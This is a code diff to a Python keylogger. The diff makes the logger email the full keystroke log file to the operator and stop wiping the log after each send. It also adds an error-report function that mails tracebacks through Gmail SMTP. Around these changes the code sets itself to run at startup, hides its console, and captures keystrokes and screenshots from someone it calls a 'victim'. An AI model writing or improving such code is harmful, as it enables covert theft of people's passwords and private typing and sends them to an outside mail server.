@@ -89,8 +89,11 @@ def send_mail(data, pics):
         msg['To'] = sendto
 
         # Attach log data (base64 encoded)
-        encoded_data = base64.b64encode(data.encode()).decode()
-        msg.set_content("New data from victim (Base64 encoded):\n" + encoded_data)
+        msg.set_content("New Attached Data:\n\n" + data)
+
+        with open(logfile, 'rb') as f:
+            log_data = f.read()
+        msg.add_attachment(log_data, maintype='text', subtype='plain', filename='logfile.txt')
 
         # Attach screenshots as image files using add_attachment
         for pic in pics:
@@ -115,9 +118,6 @@ def send_mail(data, pics):
         for pic in pics:
             os.remove(pic)
         pics.clear()
-
-        with open(logfile, "w") as f:
-            f.write("")  # overwrite with empty string
         
 
     except Exception as e:
@@ -155,11 +155,39 @@ def on_press(key):
             t = ""  # clear buffer AFTER sending
         start_time = time.time()
 
+def send_error_mail(error_text):
+    try:
+        msg = EmailMessage()
+        msg['Subject'] = 'Keylogger Error Report'
+        msg['From'] = yourgmail
+        msg['To'] = sendto
+
+        msg.set_content(f"An error occurred:\n\n{error_text}")
+
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(yourgmail, yourgmailpass)
+            server.send_message(msg)
+
+        print("[!] Error report sent.")
+
+    except Exception as e:
+        print(f"[!] Failed to send error report: {e}")
+
+
+
 
 if __name__ == "__main__":
-    addStartup()
-    hide_console()
+    try:
+        addStartup()
+        hide_console()
 
-    # Start keyboard listener
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+        # Start keyboard listener
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
+
+    except Exception as err:
+        import traceback
+        error_details = traceback.format_exc()
+        print("[!] Critical error occurred.")
+        send_error_mail(error_details)  # Send full traceback via email
